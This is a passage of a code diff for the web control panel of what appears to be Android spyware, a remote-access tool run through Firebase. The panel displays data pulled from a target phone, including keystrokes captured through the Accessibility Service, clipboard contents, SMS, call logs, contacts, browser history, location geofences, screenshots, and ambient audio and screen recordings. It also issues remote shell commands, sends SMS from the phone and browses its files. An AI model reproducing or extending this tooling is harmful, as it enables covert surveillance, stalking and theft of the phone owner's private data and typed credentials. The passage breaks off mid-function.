-        const calls = data.calls || [];
-        const countEl = document.getElementById('calls-count');
-        if (countEl) countEl.textContent = calls.length;
-        const feed = document.getElementById('calls-feed');
-        if (!feed) return;
-        if (calls.length === 0) { feed.innerHTML = 'No call data yet'; return; }
-        feed.innerHTML = calls.map(c => {
-            const icon = c.type === 'incoming' ? '📥' : c.type === 'outgoing' ? '📤' : '❌';
-            const dur = c.duration_seconds ? `${Math.floor(c.duration_seconds / 60)}m ${c.duration_seconds % 60}s` : '--';
-            return `<div class="feed-item">${icon} <strong>${escapeHtml(c.name || c.number || 'Unknown')}</strong> <small>${formatTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;
-        }).join('');
+    listenToFeed(uid, 'call_log', (d) => {
+        const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
+        const f = document.getElementById('calls-feed'); if(!f) return;
+        if(!calls.length){f.innerHTML='No call data yet';return;}
+        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
     });
-
-    // Live Calls
-    listenToFeed(uid, 'calls_live', (data) => {
-        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 10);
-        const feed = document.getElementById('calls-feed');
-        if (!feed || items.length === 0) return;
-        const liveHtml = items.map(c => {
-            const icon = c.state === 'ringing' ? '🔔' : c.state === 'offhook' ? '📞' : '📴';
-            return `<div class="feed-item live-item">${icon} <strong>${escapeHtml(c.name || c.number || 'Unknown')}</strong> <small>${c.state} • ${formatTime(c.timestamp)}</small></div>`;
-        }).join('');
-        feed.innerHTML = liveHtml + feed.innerHTML;
+    listenToFeed(uid, 'calls_live', (d) => {
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
+        const f = document.getElementById('calls-feed'); if(!f||!items.length) return;
+        f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'📴';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
     });
-
-    // Contacts
-    listenToFeed(uid, 'contacts', (data) => {
-        const contacts = data.contacts || [];
-        const countEl = document.getElementById('contacts-count');
-        if (countEl) countEl.textContent = contacts.length;
-        const feed = document.getElementById('contacts-feed');
-        if (!feed) return;
-        if (contacts.length === 0) { feed.innerHTML = 'No contact data yet'; return; }
-        feed.innerHTML = contacts.slice(0, 100).map(c =>
-            `<div class="feed-item"><strong>${escapeHtml(c.name || 'Unknown')}</strong> <small>${c.number || ''} • ${c.type || ''}</small></div>`
-        ).join('') + (contacts.length > 100 ? `<div class="feed-item">... and ${contacts.length - 100} more</div>` : '');
+    listenToFeed(uid, 'contacts', (d) => {
+        const ct = d.contacts||[]; const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
+        const f = document.getElementById('contacts-feed'); if(!f) return;
+        if(!ct.length){f.innerHTML='No contact data yet';return;}
+        f.innerHTML = ct.slice(0,100).map(c=>`<div class="feed-item"><strong>${esc(c.name||'Unknown')}</strong> <small>${c.number||''} • ${c.type||''}</small></div>`).join('') + (ct.length>100?`<div class="feed-item">... and ${ct.length-100} more</div>`:'');
     });
-
-    // Wi-Fi
-    listenToFeed(uid, 'wifi', (data) => {
-        const networks = data.nearby_networks || [];
-        const countEl = document.getElementById('wifi-count');
-        if (countEl) countEl.textContent = networks.length;
-        const feed = document.getElementById('wifi-feed');
-        if (!feed) return;
-        const currentSsid = data.current_ssid || 'Not connected';
-        let html = `<div class="feed-item" style="color:#00ff88;"> Connected: <strong>${escapeHtml(currentSsid)}</strong> (RSSI: ${data.current_rssi || '--'})</div>`;
-        html += networks.slice(0, 30).map(n => {
-            const bars = n.signal_strength > -50 ? '🟢' : n.signal_strength > -70 ? '🟡' : '🔴';
-            const lock = n.is_secured ? '🔒' : '🔓';
-            return `<div class="feed-item">${bars} ${lock} <strong>${escapeHtml(n.ssid || 'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;
-        }).join('');
-        feed.innerHTML = html;
+    listenToFeed(uid, 'wifi', (d) => {
+        const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
+        const f = document.getElementById('wifi-feed'); if(!f) return;
+        let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
+        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        f.innerHTML = h;
     });
-
-    // Apps
-    listenToFeed(uid, 'installed_apps', (data) => {
-        const apps = data.apps || [];
-        const countEl = document.getElementById('apps-count');
-        if (countEl) countEl.textContent = apps.length;
-        const feed = document.getElementById('apps-feed');
-        if (!feed) return;
-        if (apps.length === 0) { feed.innerHTML = 'No app data yet'; return; }
-        const userApps = apps.filter(a => !a.is_system);
-        const sysApps = apps.filter(a => a.is_system);
-        let html = `<div class="feed-item" style="color:#00ff88;">📦 ${userApps.length} user apps • ${sysApps.length} system apps</div>`;
-        html += userApps.slice(0, 50).map(a =>
-            `<div class="feed-item"><strong>${escapeHtml(a.name || a.package_name)}</strong> <small>v${a.version_name || '?'} • ${a.package_name}</small></div>`
-        ).join('');
-        feed.innerHTML = html;
+    listenToFeed(uid, 'installed_apps', (d) => {
+        const apps = d.apps||[]; const c = document.getElementById('apps-count'); if(c) c.textContent = apps.length;
+        const f = document.getElementById('apps-feed'); if(!f) return;
+        if(!apps.length){f.innerHTML='No app data yet';return;}
+        const ua = apps.filter(a=>!a.is_system); const sa = apps.filter(a=>a.is_system);
+        let h = `<div class="feed-item" style="color:#00ff88;">📦 ${ua.length} user apps • ${sa.length} system apps</div>`;
+        h += ua.slice(0,50).map(a=>`<div class="feed-item"><strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small></div>`).join('');
+        f.innerHTML = h;
     });
-
-    // Device Info
-    listenToFeed(uid, 'device_info', (data) => {
-        const feed = document.getElementById('deviceinfo-feed');
-        if (!feed) return;
-        const rows = [
-            ['Model', data.model], ['Brand', data.brand], ['Android', data.android_version],
-            ['SDK', data.sdk_version], ['Storage', `${data.storage_used_percent || '?'}% used (${data.storage_free_gb || '?'}GB free)`],
-            ['RAM', `${data.ram_available_mb || '?'}MB / ${data.ram_total_mb || '?'}MB`],
-            ['Carrier', data.carrier], ['Network', data.network_type],
-            ['Wi-Fi', data.wifi_ssid], ['IP', data.wifi_ip],
-            ['Screen', `${data.screen_width}x${data.screen_height}`],
-            ['Uptime', `${Math.floor((data.uptime_seconds || 0) / 3600)}h ${Math.floor(((data.uptime_seconds || 0) % 3600) / 60)}m`]
-        ];
-        feed.innerHTML = rows.map(([k, v]) =>
-            `<div class="feed-item"><strong>${k}:</strong> ${v || '--'}</div>`
-        ).join('');
+    listenToFeed(uid, 'device_info', (d) => {
+        const f = document.getElementById('deviceinfo-feed'); if(!f) return;
+        const rows = [['Model',d.model],['Brand',d.brand],['Android',d.android_version],['SDK',d.sdk_version],['Storage',`${d.storage_used_percent||'?'}% used (${d.storage_free_gb||'?'}GB free)`],['RAM',`${d.ram_available_mb||'?'}MB / ${d.ram_total_mb||'?'}MB`],['Carrier',d.carrier],['Network',d.network_type],['Wi-Fi',d.wifi_ssid],['IP',d.wifi_ip],['Screen',`${d.screen_width}x${d.screen_height}`],['Uptime',`${Math.floor((d.uptime_seconds||0)/3600)}h ${Math.floor(((d.uptime_seconds||0)%3600)/60)}m`]];
+        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
-
-    // Battery
-    listenToFeed(uid, 'battery_current', (data) => {
-        const feed = document.getElementById('battery-feed');
-        if (!feed) return;
-        const rows = [
-            ['Level', `${data.level_percent || '?'}%`], ['Status', data.status],
-            ['Health', data.health], ['Temperature', `${data.temperature_c || '?'}°C`],
-            ['Voltage', `${data.voltage_mv || '?'}mV`], ['Source', data.charge_source],
-            ['Technology', data.technology]
-        ];
-        feed.innerHTML = rows.map(([k, v]) =>
-            `<div class="feed-item"><strong>${k}:</strong> ${v || '--'}</div>`
-        ).join('');
+    listenToFeed(uid, 'battery_current', (d) => {
+        const f = document.getElementById('battery-feed'); if(!f) return;
+        const rows = [['Level',`${d.level_percent||'?'}%`],['Status',d.status],['Health',d.health],['Temp',`${d.temperature_c||'?'}°C`],['Voltage',`${d.voltage_mv||'?'}mV`],['Source',d.charge_source],['Tech',d.technology]];
+        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
-
-    // Keylogger
-    listenToFeed(uid, 'keylog', (data) => {
-        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 50);
-        const countEl = document.getElementById('keylog-count');
-        if (countEl) countEl.textContent = items.length;
-        const feed = document.getElementById('keylog-feed');
-        if (!feed) return;
-        if (items.length === 0) { feed.innerHTML = 'No keystrokes yet (enable Accessibility Service)'; return; }
-        feed.innerHTML = items.map(k =>
-            `<div class="feed-item"><strong>${escapeHtml(k.app || 'unknown')}</strong> <small>${formatTime(k.timestamp)}</small><br><code>${escapeHtml(k.text || '')}</code></div>`
-        ).join('');
+    listenToFeed(uid, 'keylog', (d) => {
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,50);
+        const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
+        const f = document.getElementById('keylog-feed'); if(!f) return;
+        if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}
+        f.innerHTML = items.map(k=>`<div class="feed-item"><strong>${esc(k.app||'unknown')}</strong> <small>${fmtTime(k.timestamp)}</small><br><code>${esc(k.text||'')}</code></div>`).join('');
     });
-
-    // Geofence Alerts
-    listenToFeed(uid, 'geofence_alerts', (data) => {
-        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
-        const feed = document.getElementById('geofence-feed');
-        if (!feed) return;
-        if (items.length === 0) { feed.innerHTML = 'No geofence alerts'; return; }
-        feed.innerHTML = items.map(g => {
-            const icon = g.event === 'LEFT' ? '🚨' : '✅';
-            return `<div class="feed-item ${g.event === 'LEFT' ? 'alert-item' : ''}">${icon} <strong>${g.event}</strong> <small>${formatTime(g.timestamp)} • ${Math.round(g.distance_meters || 0)}m away</small><br>📍 ${parseFloat(g.current_lat || 0).toFixed(6)}, ${parseFloat(g.current_lng || 0).toFixed(6)}</div>`;
-        }).join('');
+    listenToFeed(uid, 'geofence_alerts', (d) => {
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
+        const f = document.getElementById('geofence-feed'); if(!f) return;
+        if(!items.length){f.innerHTML='No geofence alerts';return;}
+        f.innerHTML = items.map(g=>{const i=g.event==='LEFT'?'🚨':'✅';return `<div class="feed-item ${g.event==='LEFT'?'alert-item':''}">${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}</div>`;}).join('');
     });
-
-    // Clipboard
-    listenToFeed(uid, 'clipboard', (data) => {
-        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
-        const feed = document.getElementById('clipboard-feed');
-        if (!feed) return;
-        if (items.length === 0) { feed.innerHTML = 'No clipboard data yet'; return; }
-        feed.innerHTML = items.map(c =>
-            `<div class="feed-item"><small>${formatTime(c.timestamp)} • ${c.length || 0} chars</small><br><code>${escapeHtml((c.text || '').substring(0, 200))}</code></div>`
-        ).join('');
+    listenToFeed(uid, 'clipboard', (d) => {
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
+        const f = document.getElementById('clipboard-feed'); if(!f) return;
+        if(!items.length){f.innerHTML='No clipboard data yet';return;}
+        f.innerHTML = items.map(c=>`<div class="feed-item"><small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code></div>`).join('');
     });
-
-    // Clipboard current
-    listenToFeed(uid, 'clipboard_current', (data) => {
-        const feed = document.getElementById('clipboard-feed');
-        if (!feed || !data || !data.text) return;
-        feed.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT CLIPBOARD</strong> <small>${formatTime(data.timestamp)}</small><br><code>${escapeHtml(data.text.substring(0, 300))}</code></div>` + feed.innerHTML;
+    listenToFeed(uid, 'clipboard_current', (d) => {
+        const f = document.getElementById('clipboard-feed'); if(!f||!d||!d.text) return;
+        f.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT</strong> <small>${fmtTime(d.timestamp)}</small><br><code>${esc(d.text.substring(0,300))}</code></div>` + f.innerHTML;
     });
-
-    // Browser History
-    listenToFeed(uid, 'browser_history', (data) => {
-        const history = data.history || [];
-        const feed = document.getElementById('browser-feed');
-        if (!feed) return;
-        if (history.length === 0) { feed.innerHTML = 'No browser history yet'; return; }
-        feed.innerHTML = history.slice(0, 50).map(h =>
-            `<div class="feed-item"><strong>${escapeHtml(h.title || 'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${escapeHtml((h.url || '').substring(0, 80))}</a> <small>${formatTime(h.date)}</small></div>`
-        ).join('');
+    listenToFeed(uid, 'browser_history', (d) => {
+        const h = d.history||[]; const f = document.getElementById('browser-feed'); if(!f) return;
+        if(!h.length){f.innerHTML='No browser history yet';return;}
+        f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
     });
-
-    // Gallery
-    listenToFeed(uid, 'gallery_list', (data) => {
-        const photos = data.photos || [];
-        const feed = document.getElementById('gallery-feed');
-        if (!feed) return;
-        if (photos.length === 0) { feed.innerHTML = 'No gallery data yet'; return; }
-        feed.innerHTML = photos.slice(0, 30).map(p =>
-            `<div class="feed-item">🖼️ <strong>${escapeHtml(p.name || 'Unknown')}</strong> <small>${formatTime(p.date_taken)} • ${(p.size_kb || 0)}KB</small></div>`
-        ).join('');
+    listenToFeed(uid, 'gallery_list', (d) => {
+        const p = d.photos||[]; const f = document.getElementById('gallery-feed'); if(!f) return;
+        if(!p.length){f.innerHTML='No gallery data yet';return;}
+        f.innerHTML = p.slice(0,30).map(p=>`<div class="feed-item">🖼️ <strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`).join('');
     });
-
-    // Shell Output
-    listenToFeed(uid, 'shell_output', (data) => {
-        const output = document.getElementById('shell-output');
-        if (output && data) {
-            output.style.display = 'block';
-            output.textContent = `$ ${data.command || ''}\n\n${data.stdout || '(no output)'}\n${data.stderr ? '\nSTDERR: ' + data.stderr : ''}\n\nExit code: ${data.exit_code ?? '?'}`;
-        }
+    listenToFeed(uid, 'shell_output', (d) => {
+        const o = document.getElementById('shell-output'); if(o&&d){o.style.display='block';o.textContent=`$ ${d.command||''}\n\n${d.stdout||'(no output)'}\n${d.stderr?'\nSTDERR: '+d.stderr:''}\n\nExit code: ${d.exit_code??'?'}`;}
     });
-
-    // File Browser
-    listenToFeed(uid, 'file_browser', (data) => {
-        const output = document.getElementById('file-output');
-        if (output && data) {
-            output.style.display = 'block';
-            const entries = data.entries || [];
-            let text = `📁 ${data.current_path || '/'}\n\n`;
-            text += entries.map(e => {
-                const icon = e.is_directory ? '📁' : '📄';
-                const size = e.is_directory ? '' : ` (${formatSize(e.size)})`;
-                return `${icon} ${e.name}${size}`;
-            }).join('\n');
-            output.textContent = text;
-        }
+    listenToFeed(uid, 'file_browser', (d) => {
+        const o = document.getElementById('file-output'); if(o&&d){o.style.display='block';const e=d.entries||[];let t=`📁 ${d.current_path||'/'}\n\n`;t+=e.map(e=>{const i=e.is_directory?'📁':'📄';const s=e.is_directory?'':` (${fmtSize(e.size)})`;return `${i} ${e.name}${s}`;}).join('\n');o.textContent=t;}
     });
-
-    // Geofence Status
-    listenToFeed(uid, 'geofence_status', (data) => {
-        const feed = document.getElementById('geofence-feed');
-        if (!feed || !data || !data.active) return;
-        const statusHtml = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${data.lat}, ${data.lng} (radius: ${data.radius}m)</div>`;
-        feed.innerHTML = statusHtml + feed.innerHTML;
+    listenToFeed(uid, 'geofence_status', (d) => {
+        const f = document.getElementById('geofence-feed'); if(!f||!d||!d.active) return;
+        f.innerHTML = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)</div>` + f.innerHTML;
     });
-
-    // Screenshot
-    listenToFeed(uid, 'screenshot', (data) => {
-        if (!data || !data.screenshot) return;
-        const img = document.getElementById('cameraPreviewFrame');
-        const placeholder = document.getElementById('mediaPlaceholderText');
-        if (img) {
-            if (placeholder) placeholder.style.display = 'none';
-            img.src = data.screenshot;
-            img.style.display = 'block';
-            const ts = document.getElementById('captureTimestamp');
-            if (ts) ts.innerText = `SCREENSHOT: ${new Date().toLocaleTimeString()}`;
-        }
+    listenToFeed(uid, 'screenshot', (d) => {
+        if(!d||!d.screenshot) return;
+        const img = document.getElementById('cameraPreviewFrame'); const ph = document.getElementById('mediaPlaceholderText');
+        if(img){if(ph) ph.style.display='none'; img.src=d.screenshot; img.style.display='block'; const ts=document.getElementById('captureTimestamp'); if(ts) ts.innerText=`SCREENSHOT: ${new Date().toLocaleTimeString()}`;}
     });
-
-    // Ambient Status
-    listenToFeed(uid, 'ambient_status', (data) => {
-        const btn = document.getElementById('cmd-ambient');
-        if (!btn || !data) return;
-        const stateEl = btn.querySelector('.toggle-state');
-        if (data.status === 'recording') {
-            btn.classList.add('active');
-            if (stateEl) { stateEl.textContent = `SEG ${data.segment || '?'}`; stateEl.style.color = '#ffaa00'; }
-        } else {
-            btn.classList.remove('active');
-            if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
-        }
+    listenToFeed(uid, 'ambient_status', (d) => {
+        const b = document.getElementById('cmd-ambient'); if(!b||!d) return; const s = b.querySelector('.toggle-state');
+        if(d.status==='recording'){b.classList.add('active');if(s){s.textContent=`SEG ${d.segment||'?'}`;s.style.color='#ffaa00';}}
+        else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
     });
-
-    // Screen Record Status
-    listenToFeed(uid, 'screen_record_status', (data) => {
-        const btn = document.getElementById('cmd-screenrec');
-        if (!btn || !data) return;
-        const stateEl = btn.querySelector('.toggle-state');
-        if (data.status === 'recording') {
-            btn.classList.add('active');
-            if (stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
-        } else if (data.status === 'complete') {
-            btn.classList.remove('active');
-            if (stateEl) { stateEl.textContent = `${data.file_size_kb || '?'}KB`; stateEl.style.color = '#00ff88'; }
-        } else {
-            btn.classList.remove('active');
-            if (stateEl) { stateEl.textContent = 'OFF'; stateEl.style.color = '#666'; }
-        }
+    listenToFeed(uid, 'screen_record_status', (d) => {
+        const b = document.getElementById('cmd-screenrec'); if(!b||!d) return; const s = b.querySelector('.toggle-state');
+        if(d.status==='recording'){b.classList.add('active');if(s){s.textContent='REC';s.style.color='#ffaa00';}}
+        else if(d.status==='complete'){b.classList.remove('active');if(s){s.textContent=`${d.file_size_kb||'?'}KB`;s.style.color='#00ff88';}}
+        else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
     });
-
-    // Traffic
-    listenToFeed(uid, 'traffic_current', (data) => {
-        const feed = document.getElementById('battery-feed');
-        if (!feed || !data) return;
-        if (feed.innerHTML.includes('Network Traffic')) return;
-        feed.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Network Traffic</strong><br>RX: ${data.total_rx_mb || '?'} | TX: ${data.total_tx_mb || '?'}<br>Mobile RX: ${data.mobile_rx_mb || '?'} | TX: ${data.mobile_tx_mb || '?'}</div>`;
+    listenToFeed(uid, 'traffic_current', (d) => {
+        const f = document.getElementById('battery-feed'); if(!f||!d) return;
+        if(f.innerHTML.includes('Network Traffic')) return;
+        f.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Network Traffic</strong><br>RX: ${d.total_rx_mb||'?'} | TX: ${d.total_tx_mb||'?'}<br>Mobile RX: ${d.mobile_rx_mb||'?'} | TX: ${d.mobile_tx_mb||'?'}</div>`;
     });
 }
 
-// Helper: Listen to a Firebase path and call callback
-function listenToFeed(uid, path, callback) {
-    const feedRef = ref(database, `devices/${uid}/${path}`);
-    const key = `feed-${path}-${uid}`;
-    if (deviceListeners[key]) off(deviceListeners[key]);
-    deviceListeners[key] = onValue(feedRef, (snapshot) => {
-        if (snapshot.exists()) {
-            try { callback(snapshot.val()); } catch (e) { console.error(`Feed error [${path}]:`, e); }
-        }
-    });
+function listenToFeed(uid, path, cb) {
+    const r = ref(database, `devices/${uid}/${path}`); const k = `feed-${path}-${uid}`;
+    if(deviceListeners[k]) off(deviceListeners[k]);
+    deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
 }
 
 // ==========================================
-// SETUP ALL COMMAND EVENT LISTENERS
+// COMMAND LISTENERS
 // ==========================================
-function setupCommandListeners(deviceUid) {
-    // ── Original toggles ──────────────────────
-    setupToggle('cmd-flashlight', deviceUid, 'flashlight');
-    setupToggle('cmd-alarm', deviceUid, 'alarm');
-
+function setupCommandListeners(uid) {
+    // Toggles
+    setupToggle('cmd-flashlight', uid, 'flashlight');
+    setupToggle('cmd-alarm', uid, 'alarm');
     const cmdLock = document.getElementById('cmd-lock');
-    if (cmdLock) {
-        cmdLock.onclick = () => {
-            const newState = !cmdLock.classList.contains("active");
-            if (confirm(newState ? "🔒 Initialize Lockdown?" : "🔓 Deactivate Lockdown?")) {
-                sendRemoteCommand(deviceUid, "emergencyLock", newState);
-            }
-        };
-    }
+    if(cmdLock) cmdLock.onclick = () => { const s=!cmdLock.classList.contains("active"); if(confirm(s?"🔒 Initialize Lockdown?":"🔓 Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); };
 
-    // ── Triggers ──────────────────────────────
-    setupTrigger('cmd-capture', deviceUid, 'cameraCapture');
-    setupTrigger('cmd-screenshot', deviceUid, 'take_screenshot');
-    setupTrigger('cmd-readsms', deviceUid, 'read_sms');
-    setupTrigger('cmd-readcalls', deviceUid, 'read_call_log');
-    setupTrigger('cmd-readcontacts', deviceUid, 'read_contacts');
-    setupTrigger('cmd-readapps', deviceUid, 'read_apps');
-    setupTrigger('cmd-scanwifi', deviceUid, 'scan_wifi');
-    setupTrigger('cmd-readbattery', deviceUid, 'read_battery');
-    setupTrigger('cmd-readtraffic', deviceUid, 'read_traffic');
-    setupTrigger('cmd-deviceinfo', deviceUid, 'collect_device_info');
-    setupTrigger('cmd-gallery', deviceUid, 'list_gallery');
-    setupTrigger('cmd-browser', deviceUid, 'read_browser_history');
-    setupTrigger('cmd-storage', deviceUid, 'storage_overview');
+    // Triggers — with 2s green flash + "SENT ✓"
+    setupTrigger('cmd-capture', uid, 'cameraCapture');
+    setupTrigger('cmd-screenshot', uid, 'take_screenshot');
+    setupTrigger('cmd-readsms', uid, 'read_sms');
+    setupTrigger('cmd-readcalls', uid, 'read_call_log');
+    setupTrigger('cmd-readcontacts', uid, 'read_contacts');
+    setupTrigger('cmd-readapps', uid, 'read_apps');
+    setupTrigger('cmd-scanwifi', uid, 'scan_wifi');
+    setupTrigger('cmd-readbattery', uid, 'read_battery');
+    setupTrigger('cmd-readtraffic', uid, 'read_traffic');
+    setupTrigger('cmd-deviceinfo', uid, 'collect_device_info');
+    setupTrigger('cmd-gallery', uid, 'list_gallery');
+    setupTrigger('cmd-browser', uid, 'read_browser_history');
+    setupTrigger('cmd-storage', uid, 'storage_overview');
 
-    // ── Toggle commands ───────────────────────
-    setupToggle('cmd-audio', deviceUid, 'record_audio');
-    setupToggle('cmd-video', deviceUid, 'record_video');
-    setupToggle('cmd-ambient', deviceUid, 'start_ambient', 'stop_ambient');
-    setupToggle('cmd-screenrec', deviceUid, 'record_screen', 'stop_screen_record');
-    setupToggle('cmd-clipboard', deviceUid, 'monitor_clipboard');
+    // Toggles
+    setupToggle('cmd-audio', uid, 'record_audio');
+    setupToggle('cmd-video', uid, 'record_video');
+    setupToggle('cmd-ambient', uid, 'start_ambient', 'stop_ambient');
+    setupToggle('cmd-screenrec', uid, 'record_screen', 'stop_screen_record');
+    setupToggle('cmd-clipboard', uid, 'monitor_clipboard');
 
-    // ── Time setter ───────────────────────────
-    const timeSetter = document.getElementById('time-setter');
-    if (timeSetter) {
-        timeSetter.onchange = (e) => {
-            if (e.target.value) sendRemoteCommand(deviceUid, 'activation_time', e.target.value);
-        };
-    }
+    // Time
+    const ts = document.getElementById('time-setter');
+    if(ts) ts.onchange = (e) => { if(e.target.value) sendCmd(uid,'activation_time',e.target.value); };
 
-    // ── Shell command ─────────────────────────
-    const shellBtn = document.getElementById('cmd-shell');
-    if (shellBtn) {
-        shellBtn.onclick = () => {
-            const input = document.getElementById('shell-input');
-            const cmd = input?.value?.trim();
-            if (cmd) {
-                sendRemoteCommand(deviceUid, 'shell_command', cmd);
-                const output = document.getElementById('shell-output');
-                if (output) { output.style.display = 'block'; output.textContent = '⏳ Executing...'; }
-            }
-        };
-    }
+    // Shell
+    const sb = document.getElementById('cmd-shell');
+    if(sb) sb.onclick = () => { const c=document.getElementById('shell-input')?.value?.trim(); if(c){sendCmd(uid,'shell_command',c); const o=document.getElementById('shell-output'); if(o){o.style.display='block';o.textContent='⏳ Executing...';}} };
 
-    // ── Send SMS ──────────────────────────────
-    const sendSmsBtn = document.getElementById('cmd-sendsms');
-    if (sendSmsBtn) {
-        sendSmsBtn.onclick = () => {
-            const number = document.getElementById('sms-number')?.value?.trim();
-            const body = document.getElementById('sms-body')?.value?.trim();
-            if (number && body) {
-                if (confirm(`Send SMS to ${number}?`)) {
-                    sendRemoteCommand(deviceUid, 'send_sms_number', number);
-                    sendRemoteCommand(deviceUid, 'send_sms_body', body);
-                }
-            }
-        };
-    }
+    // Send SMS
+    const ssb = document.getElementById('cmd-sendsms');
+    if(ssb) ssb.onclick = () => { const n=document.getElementById('sms-number')?.value?.trim(); const b=document.getElementById('sms-body')?.value?.trim(); if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} };
 
-    // ── File browser ──────────────────────────
-    const listFilesBtn = document.getElementById('cmd-listfiles');
-    if (listFilesBtn) {
-        listFilesBtn.onclick = () => {
-            const path = document.getElementById('file-path')?.value?.trim() || '/storage/emulated/0';
-            sendRemoteCommand(deviceUid, 'list_files', path);
-            const output = document.getElementById('file-output');
-            if (output) { output.style.display = 'block'; output.textContent = '⏳ Loading...'; }
-        };
-    }
+    // File browser
+    const lfb = document.getElementById('cmd-listfiles');
+    if(lfb) lfb.onclick = () => { const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; sendCmd(uid,'list_files',p); const o=document.getElementById('file-output'); if(o){o.style.display='block';o.textContent='⏳ Loading...';} };
 
-    // ── Geofence ──────────────────────────────
-    const setGeoBtn = document.getElementById('cmd-setgeo');
-    if (setGeoBtn) {
-        setGeoBtn.onclick = () => {
-            const lat = parseFloat(document.getElementById('geo-lat')?.value);
-            const lng = parseFloat(document.getElementById('geo-lng')?.value);
-            const radius = parseFloat(document.getElementById('geo-radius')?.value) || 1000;
-            if (!isNaN(lat) && !isNaN(lng)) {
-                sendRemoteCommand(deviceUid, 'geofence_lat', lat);
-                sendRemoteCommand(deviceUid, 'geofence_lng', lng);
-                sendRemoteCommand(deviceUid, 'geofence_radius', radius);
-            }
-        };
-    }
+    // Geofence
+    const sgb = document.getElementById('cmd-setgeo');
+    if(sgb) sgb.onclick = () => { const la=parseFloat(document.getElementById('geo-lat')?.value); const ln=parseFloat(document.getElementById('geo-lng')?.value); const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} };
+    const dgb = document.getElementById('cmd-disablegeo');
+    if(dgb) dgb.onclick = () => sendCmd(uid,'disable_geofence',true);
 
-    const disableGeoBtn = document.getElementById('cmd-disablegeo');
-    if (disableGeoBtn) {
-        disableGeoBtn.onclick = () => sendRemoteCommand(deviceUid, 'disable_geofence', true);
-    }
-
-    // ── Danger zone ───────────────────────────
-    const rebootBtn = document.getElementById('cmd-reboot');
-    if (rebootBtn) {
-        rebootBtn.onclick = () => {
